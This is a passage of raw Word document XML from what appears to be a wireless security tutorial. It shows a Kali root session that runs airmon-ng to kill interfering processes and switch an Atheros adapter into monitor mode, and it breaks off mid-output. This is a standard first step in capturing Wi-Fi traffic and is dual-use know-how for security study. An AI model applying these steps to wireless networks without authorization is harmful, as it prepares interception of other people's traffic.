      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>crea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>erf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ce w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>an0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s *</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode. R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:t>ov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>non-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>an0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>erface...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="140"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-28"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>ARNI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>G:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>unab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>art</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>e, p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ease</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>run "a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>ng check k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="140"/>
      </w:pPr>
      <w:hyperlink r:id="rId56">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rmon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>g check</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="260" w:right="6681" w:hanging="120"/>
      </w:pPr>
      <w:r>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>illi</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hese processes: P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>D Na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="200"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1324 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>pa_supp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>cant</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="140"/>
      </w:pPr>
      <w:hyperlink r:id="rId57">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:position w:val="-1"/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>rmon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>g start w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>an0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12"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1885"/>
        <w:gridCol w:w="1465"/>
        <w:gridCol w:w="4910"/>
      </w:tblGrid>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="358"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1885" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>P</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">HY  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="51"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>In</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>er</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:t>ace</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1465" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="283"/>
            </w:pPr>
            <w:r>
              <w:t>Dr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>ver</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4910" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:before="69"/>
              <w:ind w:left="236"/>
            </w:pPr>
            <w:r>
              <w:t>Ch</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>pset</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="358"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1885" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="40"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">phy0  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="50"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>w</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>an0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1465" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="283"/>
            </w:pPr>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>h9k_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>h</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4910" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="002B3236">
            <w:pPr>
              <w:spacing w:line="260" w:lineRule="exact"/>
              <w:ind w:left="236"/>
            </w:pPr>
            <w:r>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>heros Co</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>mm</w:t>
            </w:r>
            <w:r>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>ti</w:t>
            </w:r>
            <w:r>
              <w:t>ons, Inc.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-12"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
            <w:r>
              <w:t>R9271 802.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-10"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:t>1n</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="1558" w:right="61"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1660" w:bottom="280" w:left="1100" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ac80</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">mode </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>enab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for [phy0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>an0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on [phy0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>an0m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>) (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ac80</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1 s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode</w:t>
